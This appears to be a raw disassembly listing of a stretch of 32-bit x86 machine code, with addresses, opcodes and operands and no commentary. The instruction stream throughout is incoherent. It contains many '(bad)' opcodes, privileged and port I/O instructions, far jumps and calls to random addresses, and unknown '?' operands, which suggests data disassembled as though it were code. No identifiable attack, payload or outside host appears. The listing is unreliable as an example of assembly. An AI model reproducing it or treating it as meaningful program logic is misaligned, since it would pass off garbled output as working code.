  41edcc:	(bad)  
  41edcd:	jmp    0x9fb9e9f7
  41edd2:	and    esp,esp
  41edd4:	xchg   BYTE PTR [esi],bl
  41edd6:	and    ebp,DWORD PTR [edx-0x5a]
  41edd9:	mov    ds:0x9d8e7b24,al
  41edde:	(bad)  
  41eddf:	jl     0x41edaa
  41ede1:	xchg   edx,eax
  41ede2:	adc    ebp,ebp
  41ede4:	test   eax,0xf73d919b
  41ede9:	cmc    
  41edea:	inc    ecx
  41edeb:	jle    0x41ee10
  41eded:	jmp    0xc707:0xdb86982
  41edf4:	fstp   TBYTE PTR [ebx+0x4df39740]
  41edfa:	ins    BYTE PTR es:[edi],dx
  41edfb:	call   0xa0ac2c4c
  41ee00:	outs   dx,DWORD PTR ds:[esi]
  41ee01:	jne    0x41ee0e
  41ee03:	mov    eax,?
  41ee05:	push   eax
  41ee06:	stos   BYTE PTR es:[edi],al
  41ee07:	mov    cl,BYTE PTR [esi-0x1398aa6f]
  41ee0d:	inc    esp
  41ee0e:	or     eax,0x903b3d26
  41ee13:	loopne 0x41edc7
  41ee15:	jle    0x41ee89
  41ee17:	or     eax,0xac780887
  41ee1c:	mov    ebp,0xf6afcf99
  41ee21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee22:	inc    edx
  41ee23:	sub    DWORD PTR [ecx+0x76],ecx
  41ee26:	adc    DWORD PTR [esi-0x4efb6381],ecx
  41ee2c:	retf   0xe964
  41ee2f:	mov    fs,WORD PTR [ecx+0x25]
  41ee32:	pop    esp
  41ee33:	lock and ch,BYTE PTR [ebx-0x46219e6a]
  41ee3a:	inc    esi
  41ee3b:	sub    ecx,DWORD PTR [eax]
  41ee3d:	push   cs
  41ee3e:	ins    DWORD PTR es:[edi],dx
  41ee3f:	les    ebx,FWORD PTR [edx]
  41ee41:	jae    0x41edd2
  41ee43:	dec    esp
  41ee44:	rol    DWORD PTR [edi-0x5b],1
  41ee47:	push   ds
  41ee48:	dec    ebp
  41ee49:	mov    ebp,0xc50d42f7
  41ee4e:	into   
  41ee4f:	clc    
  41ee50:	sub    BYTE PTR [ecx-0x46027aab],ah
  41ee56:	lahf   
  41ee57:	out    0xd0,eax
  41ee59:	mov    ds:0xd49511bb,eax
  41ee5e:	lock push ds
  41ee60:	outs   dx,BYTE PTR ds:[esi]
  41ee61:	rcl    BYTE PTR [esi+0x41],1
  41ee64:	(bad)  
  41ee65:	push   ecx
  41ee66:	cwde   
  41ee67:	cmp    eax,0xcb286fe5
  41ee6c:	bound  edi,QWORD PTR [ecx*2-0x2807384b]
  41ee73:	cmp    al,0x4b
  41ee75:	sbb    dl,ah
  41ee77:	pusha  
  41ee78:	fwait
  41ee79:	lock test al,0xc4
  41ee7c:	inc    ecx
  41ee7d:	cmp    eax,0x211d742c
  41ee82:	pop    ebp
  41ee83:	sbb    esi,DWORD PTR [eax-0x2f]
  41ee86:	in     eax,dx
  41ee87:	dec    esi
  41ee88:	enter  0x613a,0xb9
  41ee8c:	xor    edx,DWORD PTR [ecx]
  41ee8e:	test   al,0x99
  41ee90:	push   ds
  41ee91:	push   esi
  41ee92:	jno    0x41eeda
  41ee94:	mov    esi,0x945db666
  41ee99:	aas    
  41ee9a:	push   eax
  41ee9b:	js     0x41eea0
  41ee9d:	cmp    DWORD PTR [edx-0x32],edx
  41eea0:	(bad)  
  41eea1:	div    edi
  41eea3:	dec    esi
  41eea4:	ret    
  41eea5:	fwait
  41eea6:	sbb    ch,dh
  41eea8:	jae    0x41eebf
  41eeaa:	push   ecx
  41eeab:	xor    dh,ah
  41eead:	out    0x6f,eax
  41eeaf:	xor    al,0x7
  41eeb1:	mov    ebp,0x939b3f13
  41eeb6:	inc    edx
  41eeb7:	pop    ds
  41eeb8:	jo     0x41ef22
  41eeba:	lods   eax,DWORD PTR ds:[esi]
  41eebb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eebc:	data16 test BYTE PTR [ecx+eax*2],0x68
  41eec1:	cmp    DWORD PTR [edi],edx
  41eec3:	mov    al,0xdb
  41eec5:	adc    DWORD PTR [esi+0x34299ea3],ebp
  41eecb:	jne    0x41ef13
  41eecd:	sbb    BYTE PTR [esi],0x1c
  41eed0:	lock push esi
  41eed2:	xchg   esp,eax
  41eed3:	sub    esp,0xc19916e1
  41eed9:	aad    0xf
  41eedb:	jnp    0x41ee96
  41eedd:	out    0x2d,eax
  41eedf:	fmul   st,st(4)
  41eee1:	pop    ecx
  41eee2:	push   ecx
  41eee3:	xchg   esp,eax
  41eee4:	sbb    bl,BYTE PTR [edi]
  41eee6:	out    0xba,al
  41eee8:	mov    esp,DWORD PTR [ebp+0x18]
  41eeeb:	mov    al,0x69
  41eeed:	adc    al,0x1a
  41eeef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eef0:	jmp    0x7086d02e
  41eef5:	or     ecx,DWORD PTR [ecx+eax*1-0x63b0d51f]
  41eefc:	inc    edx
  41eefd:	cmp    al,0xc5
  41eeff:	stos   BYTE PTR es:[edi],al
  41ef00:	and    BYTE PTR [edi],ah
  41ef02:	adc    DWORD PTR [edx-0x68],0x762bca01
  41ef09:	sbb    al,BYTE PTR [eax-0x33f2cebf]
  41ef0f:	lds    edx,FWORD PTR [ecx]
  41ef11:	aaa    
  41ef12:	cmp    ch,BYTE PTR [esi-0x11898519]
  41ef18:	lea    ebx,[eax]
  41ef1a:	and    al,0x86
  41ef1c:	xor    al,0x83
  41ef1e:	inc    esi
  41ef1f:	pop    ds
  41ef20:	add    BYTE PTR [esi],dl
  41ef22:	xor    eax,0xeea92057
  41ef27:	rcl    DWORD PTR [ecx],cl
  41ef29:	dec    ebx
  41ef2a:	aam    0xb
  41ef2c:	sbb    esi,ebx
  41ef2e:	add    eax,0xc51bf826
  41ef33:	mov    WORD PTR [ecx],fs
  41ef35:	ins    DWORD PTR es:[edi],dx
  41ef36:	and    dl,BYTE PTR [edx]
  41ef38:	xlat   BYTE PTR ds:[ebx]
  41ef39:	sub    esi,DWORD PTR [eax]
  41ef3b:	push   edi
  41ef3c:	mov    al,ds:0xfaa9eac5
  41ef41:	inc    edi
  41ef42:	popa   
  41ef43:	pushf  
  41ef44:	xchg   ebx,eax
  41ef45:	fcom   DWORD PTR [ebx+0x58]
  41ef48:	mov    ds:0xb4df889c,eax
  41ef4d:	xchg   edx,eax
  41ef4e:	cmp    BYTE PTR [esi+0xa],cl
  41ef51:	call   DWORD PTR [esi-0x22394b70]
  41ef57:	push   cs
  41ef58:	or     bh,BYTE PTR [ebp+0x6f4d9b9]
  41ef5e:	and    edi,0x15
  41ef61:	pushf  
  41ef62:	adc    eax,0x15ad53fb
  41ef67:	(bad)  
  41ef68:	xor    dh,BYTE PTR [eax]
  41ef6a:	xor    eax,0x46023c2e
  41ef6f:	pop    es
  41ef70:	loopne 0x41ef7a
  41ef72:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41ef74:	(bad)  
  41ef75:	pop    ecx
  41ef76:	int    0x93
  41ef78:	call   0x4cbe:0x2a69665c
  41ef7f:	fwait
  41ef80:	sti    
  41ef81:	dec    edx
  41ef82:	retf   0x2340
  41ef85:	xor    al,0x0
  41ef87:	dec    edi
  41ef88:	scas   al,BYTE PTR es:[edi]
  41ef89:	shl    BYTE PTR [ebp-0xc],1
  41ef8c:	and    al,0xc6
  41ef8e:	jmp    0x41eff0
  41ef90:	call   0x3309:0xa3ed6ad3
  41ef97:	mov    edi,0x8cd072e2
  41ef9c:	rcl    edi,1
  41ef9e:	sahf   
  41ef9f:	fsub   st(5),st
  41efa1:	mov    ds:0xf80b75db,eax
  41efa6:	xchg   ebx,eax
  41efa7:	sti    
  41efa8:	aaa    
  41efa9:	mov    bh,0x44
  41efab:	jp     0x41f01c
  41efad:	inc    esp
  41efae:	adc    al,0xf
  41efb0:	popf   
  41efb1:	inc    ebx
  41efb2:	or     ebx,DWORD PTR [ecx+0x4af94612]
  41efb8:	inc    ecx
  41efb9:	mov    edx,0xd3bc81a8
  41efbe:	test   BYTE PTR [edx+0x2a],0x8d
  41efc2:	push   esp
  41efc3:	jecxz  0x41ef4d
  41efc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efc6:	or     eax,0xe03aa5f8
  41efcb:	into   
  41efcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efcd:	out    dx,eax
  41efce:	dec    edx
  41efcf:	(bad)  
  41efd0:	icebp  
  41efd1:	out    dx,al
  41efd2:	sbb    eax,0xf8994253
  41efd7:	pop    ss
  41efd8:	pop    ds
  41efd9:	inc    BYTE PTR [eax+0x72]
  41efdc:	add    al,0x2
  41efde:	or     DWORD PTR [eax-0x23],ebp
  41efe1:	xlat   BYTE PTR ds:[ebx]
  41efe2:	imul   edx,DWORD PTR [edi+ebx*1+0x33],0xffffffbd
  41efe7:	rol    DWORD PTR [ecx+0x3cff4614],cl
  41efed:	push   ss
  41efee:	fwait
  41efef:	out    dx,eax
  41eff0:	in     al,dx
  41eff1:	inc    ecx
  41eff2:	push   edx
  41eff3:	in     eax,dx
  41eff4:	dec    eax
  41eff5:	sbb    BYTE PTR [edi-0x3],bh
  41eff8:	xor    al,0xa3
  41effa:	sub    BYTE PTR [ebp+esi*2-0x352f3ab9],dl
  41f001:	in     al,dx
  41f002:	or     al,0x80
  41f004:	push   ebx
  41f005:	xchg   esi,esp
  41f007:	rol    bl,cl
  41f009:	cmp    esi,edx
  41f00b:	jge    0x41efdb
  41f00d:	fsub   DWORD PTR [esi]
  41f00f:	bound  esi,QWORD PTR [edx-0x71]
  41f012:	call   0xc7415648
  41f017:	xchg   edi,eax
  41f018:	xor    ecx,DWORD PTR [ecx-0x484f323b]
  41f01e:	inc    esi
  41f01f:	mov    al,0x98
  41f021:	loopne 0x41f023
  41f023:	pop    ebx
  41f024:	mov    eax,0x3bc531f1
  41f029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f02a:	lods   al,BYTE PTR ds:[esi]
  41f02b:	cmp    esi,DWORD PTR [ebx+edi*1-0xfe41247]
  41f032:	test   ebp,ebp
  41f034:	imul   esp,DWORD PTR [edx],0xe0f305de
  41f03a:	jns    0x41f00c
  41f03c:	inc    ebx
  41f03d:	add    edx,DWORD PTR [ecx+0x2f5fde6b]
  41f043:	jbe    0x41f02d
  41f045:	into   
  41f046:	ss cli 
  41f048:	jns    0x41efea
  41f04a:	push   ebp
  41f04b:	jns    0x41f079
  41f04d:	sbb    esp,DWORD PTR [ebx-0x5d9df27c]
  41f053:	push   0xb141329f
  41f058:	mov    ds:0xf532a77f,eax
  41f05d:	rcl    BYTE PTR [ecx+edi*8-0x502854f7],0x96
  41f065:	outs   dx,BYTE PTR ds:[esi]
  41f066:	paddsw mm2,QWORD PTR [esp+ebp*2]
  41f06a:	mov    eax,0x1213a157
  41f06f:	mov    cl,BYTE PTR [ebx+eiz*2]
  41f072:	adc    DWORD PTR [eax+esi*2-0x433bfb3c],edx
  41f079:	les    ebp,FWORD PTR [edi+0x2]
  41f07c:	mov    ebp,0xb40b80af
  41f081:	dec    ebp
  41f082:	sbb    eax,eax
  41f084:	sbb    DWORD PTR [ebp-0x6c],esi
  41f087:	mov    dh,0x93
  41f089:	out    dx,eax
  41f08a:	arpl   WORD PTR [ebx+0x1e],bx
  41f08d:	add    DWORD PTR [esi+0x70],esp
  41f090:	retf   0xe7d4
  41f093:	ins    BYTE PTR es:[edi],dx
  41f094:	xchg   esi,eax
  41f095:	sbb    eax,0x9faadfce
  41f09a:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41f09c:	loope  0x41f07e
  41f09e:	mov    eax,0x8ed26927
  41f0a3:	cmp    ch,ch
  41f0a5:	fadd   st(2),st
  41f0a7:	mov    ch,0xcc
  41f0a9:	xchg   esi,eax
  41f0aa:	int3   
  41f0ab:	add    eax,0xf7b7b506
  41f0b0:	adc    DWORD PTR [ebx+0x2e],edx
  41f0b3:	inc    ebp
  41f0b4:	pop    ebp
  41f0b5:	inc    ebx
  41f0b6:	cmp    eax,DWORD PTR [edi+0x36]
  41f0b9:	mov    al,ds:0x4276cdda
  41f0be:	lds    ebp,FWORD PTR [esi]
  41f0c0:	xchg   ebp,eax
  41f0c1:	push   cs
  41f0c2:	test   BYTE PTR [edi],dh
  41f0c4:	push   bx
  41f0c6:	nop
  41f0c7:	mov    al,ds:0xb941818c
  41f0cc:	loop   0x41f138
  41f0ce:	mov    ds:0x77aa21c0,eax
  41f0d3:	sahf   
  41f0d4:	and    BYTE PTR [ebx],bh
  41f0d6:	sbb    esp,esi
  41f0d8:	repz les edi,FWORD PTR [esi+0x46e8d951]
  41f0df:	push   ebx
  41f0e0:	mov    al,0xd9
  41f0e2:	stos   BYTE PTR es:[edi],al
  41f0e3:	add    al,0xc3
  41f0e5:	lods   al,BYTE PTR ds:[esi]
  41f0e6:	addr16 push 0x51005087
  41f0ec:	ret    0xed89
  41f0ef:	imul   eax,DWORD PTR [edi],0xc09284da
  41f0f5:	pop    ds
  41f0f6:	cmp    BYTE PTR [edx-0x19308d5d],0x52
  41f0fd:	xor    al,0xa2
  41f0ff:	sbb    BYTE PTR [ebp-0x77b684d2],ch
  41f105:	aad    0x94
  41f107:	add    DWORD PTR ds:0xd72f45eb,esi
  41f10d:	jecxz  0x41f100
  41f10f:	es cmp dl,ah
  41f112:	or     dl,cl
  41f114:	cwde   
  41f115:	cmp    edi,eax
  41f117:	jnp    0x41f129
  41f119:	fild   DWORD PTR [eax-0x33996171]
  41f11f:	xchg   DWORD PTR [ebx*4+0x73e05c67],esi
  41f126:	add    al,cl
  41f128:	push   ds
  41f129:	mov    BYTE PTR [esi+0x72f0f1c7],al
  41f12f:	out    0xe1,al
  41f131:	ret    
  41f132:	mov    edx,0x59d4c7c8
  41f137:	mov    esp,0xe7db75bc
  41f13c:	dec    edx
  41f13d:	jecxz  0x41f0ec
  41f13f:	or     cl,dh
  41f141:	inc    edx
  41f142:	imul   esp,DWORD PTR [eax+edi*2-0x61],0xffffff9c
  41f147:	call   0x941ac0
  41f14c:	mov    cl,BYTE PTR [ebx-0x77]
  41f14f:	ret    
  41f150:	js     0x41f14b
  41f152:	call   0x19b8:0x3d8f18a5
  41f159:	sahf   
  41f15a:	sbb    al,0x16
  41f15c:	or     al,0x22
  41f15e:	ja     0x41f133
  41f160:	xchg   ecx,eax
  41f161:	sub    al,0xa9
  41f163:	cs xor al,0xea
  41f166:	cmp    BYTE PTR [eax+edx*4],ch
  41f169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f16a:	adc    al,0x9
  41f16c:	xor    edi,esp
  41f16e:	aad    0x9e
  41f170:	xchg   ecx,eax
  41f171:	es mov bl,0xeb
  41f174:	les    ebp,FWORD PTR [ebp+0x3a0cf530]
  41f17a:	ins    DWORD PTR es:[edi],dx
  41f17b:	or     eax,0x86c33020
  41f180:	add    DWORD PTR [edx+0x388e7bc2],0x65c2e33a
  41f18a:	inc    edx
  41f18b:	add    eax,0xc27f78e2
  41f190:	adc    dl,BYTE PTR [ebp+0x30]
  41f193:	ret    0x8e71
  41f196:	inc    edi
  41f197:	scas   al,BYTE PTR es:[edi]
  41f198:	mov    edx,0x2c5906c7
  41f19d:	gs or  eax,0x576d1ce9
  41f1a3:	mov    al,ds:0xad129eb7
  41f1a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1a9:	inc    edi
  41f1aa:	fcmovb st,st(6)
  41f1ac:	xchg   esp,eax
  41f1ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1ae:	sbb    al,0xe2
  41f1b0:	mov    dh,ch
  41f1b2:	and    esi,ebx
  41f1b4:	push   esi
  41f1b5:	adc    BYTE PTR [ecx],0xf9
  41f1b8:	inc    edx
  41f1b9:	sti    
  41f1ba:	les    eax,FWORD PTR [edx+0x7fe600c0]
  41f1c0:	inc    esp
  41f1c1:	popa   
  41f1c2:	push   es
  41f1c3:	out    0xe2,eax
  41f1c5:	pop    esi
  41f1c6:	fwait
  41f1c7:	mov    edx,0x4cfa0bb
  41f1cc:	adc    edi,esi
  41f1ce:	and    ch,BYTE PTR [edi-0x2eea5daf]
  41f1d4:	outs   dx,DWORD PTR ds:[esi]
  41f1d5:	mov    al,ds:0x55317cd2
  41f1da:	aaa    
  41f1db:	leave  
  41f1dc:	cmp    ebp,esi
  41f1de:	test   BYTE PTR [ebp+esi*8-0x29],al
  41f1e2:	sbb    eax,0x180715fe
  41f1e7:	fstp   DWORD PTR [ecx+0x3f]
  41f1ea:	popa   
  41f1eb:	jnp    0x41f1ac
  41f1ed:	jmp    0x41f1f3
  41f1ef:	mov    ebx,0x6b7e46ea
  41f1f4:	xchg   BYTE PTR [eax-0x7],ch
  41f1f7:	inc    esp
  41f1f8:	sahf   
  41f1f9:	jne    0x41f1fb
  41f1fb:	test   eax,0x3289d49b
  41f200:	(bad)  
  41f201:	jns    0x41f248
  41f203:	(bad)  
  41f204:	out    dx,eax
  41f205:	mov    BYTE PTR [esi],al
  41f207:	or     esp,DWORD PTR [edx-0x23]
  41f20a:	jae    0x41f1c0
  41f20c:	lds    ebx,FWORD PTR [edi-0x1e90c8bd]
  41f212:	out    dx,al
  41f213:	or     eax,0xd460544e
  41f218:	jbe    0x41f26e
  41f21a:	sti    
  41f21b:	retf   0x841
  41f21e:	into   
  41f21f:	jbe    0x41f1de
  41f221:	jne    0x41f1eb
  41f223:	jne    0x41f28d
  41f225:	xchg   ebx,eax
  41f226:	test   DWORD PTR [esi+0x7da344c],esi
  41f22c:	(bad)  
  41f22d:	jmp    edi
  41f22f:	xchg   ebp,eax
  41f230:	jge    0x41f266
  41f232:	adc    ecx,ecx
  41f234:	mov    ds:0x60c234dc,al
  41f239:	push   esp
  41f23a:	out    0xd5,al
  41f23c:	mov    ch,0xac
  41f23e:	mov    ds:0x887307d1,al
  41f243:	es dec ecx
  41f245:	imul   edx,DWORD PTR [ebp-0x43],0xaceeb489
  41f24c:	frstor [edx]
  41f24e:	xchg   DWORD PTR [ebx],ebx
  41f250:	inc    ebx
  41f251:	jmp    edx
  41f253:	outs   dx,BYTE PTR ds:[esi]
  41f254:	(bad)  
  41f255:	inc    ecx
  41f256:	mov    ecx,DWORD PTR [edx]
  41f258:	arpl   WORD PTR ds:0x6984f481,cx
  41f25e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f25f:	(bad)  
  41f260:	dec    esp
  41f261:	ins    BYTE PTR es:[edi],dx
  41f262:	inc    edx
  41f263:	dec    edx
  41f264:	clc    
  41f265:	and    al,0xbc
  41f267:	xor    ebx,DWORD PTR [edx+eax*8]
  41f26a:	js     0x41f27a
  41f26c:	dec    ebx
  41f26d:	dec    eax
  41f26e:	pop    ds
  41f26f:	jmp    0x41f2a9
  41f271:	adc    eax,DWORD PTR [ecx-0x7eda3aff]
  41f277:	xchg   ecx,eax
  41f278:	xor    eax,0x1580cd5e
  41f27d:	xor    edx,ebp
  41f27f:	push   esi
  41f280:	(bad)  
  41f282:	xchg   DWORD PTR [eax],eax
  41f284:	int    0xf7
  41f286:	add    dl,BYTE PTR es:[ebp-0x31d6af70]
  41f28d:	loop   0x41f261
  41f28f:	mov    ah,0x8c
  41f291:	je     0x41f2d0
  41f293:	rsm    
  41f295:	lods   al,BYTE PTR ds:[esi]
  41f296:	clc    
  41f297:	pop    edx
  41f298:	inc    ebp
  41f299:	(bad)  
  41f29a:	pop    edi
  41f29b:	lods   al,BYTE PTR ds:[esi]
  41f29c:	aam    0xe6
  41f29e:	jne    0x41f2d6
  41f2a0:	imul   edx,DWORD PTR [esi],0x71
  41f2a3:	mov    BYTE PTR [eax],cl
  41f2a5:	mov    ?,WORD PTR [edi-0x70f332ea]
  41f2ab:	out    dx,al
  41f2ac:	jle    0x41f290
  41f2ae:	mov    esp,0x49744b36
  41f2b3:	pop    es
  41f2b4:	imul   esp,DWORD PTR [esi-0x30],0x9624adb
  41f2bb:	and    BYTE PTR [edx+0x41],ch
  41f2be:	fwait
  41f2bf:	mov    ecx,0x3d1a13c6
  41f2c4:	lods   al,BYTE PTR ds:[esi]
  41f2c5:	dec    edi
  41f2c6:	sub    BYTE PTR [eax+0x2484422c],bl
  41f2cc:	jns    0x41f28f
  41f2ce:	arpl   bp,sp
  41f2d0:	test   DWORD PTR [ebx+esi*4],esi
  41f2d3:	test   BYTE PTR [ebp-0x43],cl
  41f2d6:	jp     0x41f25b
  41f2d8:	inc    esp
  41f2d9:	pop    ss
  41f2da:	lahf   
  41f2db:	sub    cl,bl
  41f2dd:	jecxz  0x41f353
  41f2df:	inc    edx
  41f2e0:	jo     0x41f2d2
  41f2e2:	jmp    0x41f334
  41f2e4:	xor    BYTE PTR [edx],0xfa
  41f2e7:	mov    ds:0xb1f7e34c,eax
  41f2ec:	iret   
  41f2ed:	std    
  41f2ee:	add    eax,0xc40191ac
  41f2f3:	mov    edx,0xc9f53dff
  41f2f8:	arpl   bx,dx
  41f2fa:	mov    esp,0xdf2d3d68
  41f2ff:	ja     0x41f2e2
  41f301:	(bad)  
  41f302:	adc    ebx,DWORD PTR [edi+ebx*8+0xb]
  41f306:	test   eax,0xdd3919c3
  41f30b:	jl     0x41f296
  41f30d:	ss ins BYTE PTR es:[edi],dx
  41f30f:	mov    bl,BYTE PTR [esi-0x11]
  41f312:	repnz mov eax,0xcd271f0e
  41f318:	jne    0x41f31b
  41f31a:	out    0xe2,al
  41f31c:	aam    0x45
  41f31e:	push   ss
  41f31f:	adc    al,0x6b
  41f321:	adc    DWORD PTR [eax+ecx*8],esp
  41f324:	inc    edi
  41f325:	push   cs
  41f326:	or     esi,edi
  41f328:	bound  edi,QWORD PTR [eax-0x75]
  41f32b:	sub    al,0x6c
  41f32d:	jbe    0x41f2c3
  41f32f:	(bad)  
  41f330:	xor    dl,BYTE PTR [ebx]
  41f332:	icebp  
  41f333:	sbb    al,0xff
  41f335:	loope  0x41f386
  41f337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f338:	dec    edi
  41f339:	sbb    edx,ebp
  41f33b:	xor    ebp,DWORD PTR [eax+0x53]
  41f33e:	call   0x494c:0x29688a6f
  41f345:	mov    esi,0x44a5f470
  41f34a:	mov    edx,0xa51c303c
  41f34f:	pop    ebp
  41f350:	mov    cl,0x80
  41f352:	fistp  DWORD PTR [eax-0x2c476938]
  41f358:	adc    bl,ch
  41f35a:	pop    es
  41f35b:	sub    al,0x39
  41f35d:	sbb    al,0x5d
  41f35f:	mov    ebx,0x1ca0dc36
  41f364:	aaa    
  41f365:	aam    0xe7
  41f367:	cmp    al,0x1
  41f369:	adc    BYTE PTR [edx+esi*8-0x2c],cl
  41f36d:	or     ebx,DWORD PTR [ebp+0x6b30de2]
  41f373:	mov    ebx,edx
  41f375:	enter  0xe298,0x99
  41f379:	loopne 0x41f35c
  41f37b:	cmp    dl,ah
  41f37d:	icebp  
  41f37e:	sahf   
  41f37f:	jns    0x41f344
  41f381:	sub    BYTE PTR [ebx+0x1381ce54],dh
  41f387:	into   
  41f388:	xchg   edx,eax
  41f389:	dec    esi
  41f38a:	std    
  41f38b:	or     DWORD PTR [ebx],ebx
  41f38d:	fwait
  41f38e:	adc    DWORD PTR [edx+edx*2],edx
  41f391:	dec    esi
  41f392:	push   cs
  41f393:	fcomp  st(7)
  41f395:	iret   
  41f396:	mov    DWORD PTR [edx-0x219401ba],esp
  41f39c:	adc    edx,ecx
  41f39e:	push   ds
  41f39f:	nop
  41f3a0:	add    al,0x52
  41f3a2:	retf   0x8faf
  41f3a5:	xor    BYTE PTR [ecx+0x3f5cf17f],ah
  41f3ab:	cs aam 0xc7
  41f3ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3af:	xchg   edi,eax
  41f3b0:	and    BYTE PTR [esi],ch
  41f3b2:	jecxz  0x41f3f3
  41f3b4:	nop    DWORD PTR [ebx]
  41f3b7:	jp     0x41f35d
  41f3b9:	mov    esi,0x6740a0ce
  41f3be:	jne    0x41f3a1
  41f3c0:	jnp    0x41f3c7
  41f3c2:	inc    ecx
  41f3c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3c4:	mov    ecx,0x43eaad86
  41f3c9:	mov    ebx,0x35211271
  41f3ce:	mov    dh,0xb0
  41f3d0:	fild   QWORD PTR fs:[edx]
  41f3d3:	mov    esp,DWORD PTR [ebx+0x1d]
  41f3d6:	mov    bl,0xd4
  41f3d8:	das    
  41f3d9:	(bad)  
  41f3da:	in     eax,0xd6
  41f3dc:	and    eax,0x8345645
  41f3e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3e2:	and    eax,0xe1a1f1ad
  41f3e7:	push   cs
  41f3e8:	pop    ds
  41f3e9:	inc    ecx
  41f3ea:	inc    ebx
  41f3eb:	int3   
  41f3ec:	adc    eax,0xb17b4734
  41f3f1:	push   ecx
  41f3f2:	stc    
  41f3f3:	adc    BYTE PTR [bp-0x1b],dl
  41f3f7:	call   0xc5eb:0x4c717166
  41f3fe:	mov    esp,0x2e0a7aa5
  41f403:	test   al,0xb2
  41f405:	mov    al,ds:0xcfc82e2a
  41f40a:	add    BYTE PTR [edi],0xe3
  41f40d:	sbb    eax,0x335f5089
  41f412:	sbb    DWORD PTR [esi+0x53c21041],edi
  41f418:	xor    DWORD PTR [esi+0x7b708662],ebx
  41f41e:	mov    ds:0xddeb9ab3,al
  41f423:	add    al,BYTE PTR ds:0xb46a4257
  41f429:	add    bl,BYTE PTR [ebx-0x61fe24d6]
  41f42f:	or     DWORD PTR [ecx-0x1ae1bacf],esi
  41f435:	mov    edi,0x186c6d52
  41f43a:	call   0xd0204cbe
  41f43f:	or     bh,BYTE PTR [edi+0x1f72a933]
  41f445:	(bad)  
  41f448:	shr    BYTE PTR [ecx+0x4],1
  41f44b:	xor    bl,dl
  41f44d:	cdq    
  41f44e:	jmp    0x2954ac9c
  41f453:	dec    edi
  41f454:	pop    esi
  41f455:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f456:	push   eax
  41f457:	pop    ebp
  41f458:	add    BYTE PTR [ebx+esi*1],0xba
  41f45c:	xor    bh,BYTE PTR [ecx-0x57]
  41f45f:	add    DWORD PTR ds:0x7cc3613f,ebp
  41f465:	test   BYTE PTR [ebx-0x5d92b6f4],0xf8
  41f46c:	cmp    dl,BYTE PTR [ecx+0x17]
  41f46f:	push   cs
  41f470:	push   ds
  41f471:	pop    es
  41f472:	rcr    eax,0x17
  41f475:	push   edi
  41f476:	push   eax
  41f477:	sbb    dl,bh
  41f479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f47a:	cdq    
  41f47b:	aam    0xb0
  41f47d:	shl    BYTE PTR [ebx+ebx*2+0x7dfc48da],0xee
  41f485:	jo     0x41f4ea
  41f487:	jp     0x41f4cd
  41f489:	enter  0x26ce,0x4
  41f48d:	test   BYTE PTR [eax],ch
  41f48f:	cld    
  41f490:	pushf  
  41f491:	fild   QWORD PTR [ebp+0x48]
  41f494:	in     eax,0x8d
  41f496:	leave  
  41f497:	sbb    esp,edi
  41f499:	add    eax,ebx
  41f49b:	neg    BYTE PTR [ebx]
  41f49d:	cdq    
  41f49e:	loope  0x41f48c
  41f4a0:	sub    al,0x6d
  41f4a2:	sub    BYTE PTR [edx-0x52],ah
  41f4a5:	dec    ebp
  41f4a6:	popf   
  41f4a7:	in     al,dx
  41f4a8:	push   edx
  41f4a9:	mov    edx,0x831124c5
  41f4ae:	iret   
  41f4af:	mov    ds:0x4e29822b,eax
  41f4b4:	rdtsc  
  41f4b6:	test   BYTE PTR [esi+0x1e],0x1e
  41f4ba:	add    edx,DWORD PTR [ecx-0x67]
  41f4bd:	adc    dl,BYTE PTR [edx]
  41f4bf:	cmp    BYTE PTR [ecx+0x7f14e349],dl
  41f4c5:	fld    DWORD PTR [edx-0x16fbc0f]
  41f4cb:	les    eax,FWORD PTR [eax-0x52]
  41f4ce:	cmc    
  41f4cf:	dec    ecx
  41f4d0:	loopne 0x41f4e9
  41f4d2:	stos   BYTE PTR es:[edi],al
  41f4d3:	(bad)  
  41f4d4:	lea    edi,[ebx]
  41f4d6:	push   edi
  41f4d7:	lods   al,BYTE PTR ds:[esi]
  41f4d8:	and    esp,DWORD PTR [edi-0x20467ebf]
  41f4de:	(bad)  
  41f4e0:	xchg   esp,eax
  41f4e1:	scas   eax,DWORD PTR es:[edi]
  41f4e2:	or     BYTE PTR [ebx],dh
  41f4e4:	sub    cl,BYTE PTR [esi-0x76]
  41f4e7:	or     esp,edi
  41f4e9:	stos   BYTE PTR es:[edi],al
  41f4ea:	add    edi,ecx
  41f4ec:	push   cs
  41f4ed:	xlat   BYTE PTR ds:[ebx]
  41f4ee:	pop    ebx
  41f4ef:	mov    al,0x7e
  41f4f1:	jmp    0xfe78643f
  41f4f6:	jbe    0x41f552
  41f4f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4f9:	or     BYTE PTR [eax+0x746601a],bh
  41f4ff:	jmp    0xf67c:0x142d1011
  41f506:	(bad)  
  41f507:	shl    DWORD PTR [ebx+0x75c783a3],1
  41f50d:	popf   
  41f50e:	pop    edx
  41f50f:	add    DWORD PTR [eax+eiz*4-0x77],edx
  41f513:	or     cl,BYTE PTR [ecx+esi*4-0x755d0c7d]
  41f51a:	push   cs
  41f51b:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41f51d:	pop    eax
  41f51e:	push   ss
  41f51f:	es xor dh,dh
  41f522:	add    BYTE PTR [ecx+ecx*4+0x27],ch
  41f526:	mov    BYTE PTR [ecx-0x6afbed3c],al
  41f52c:	icebp  
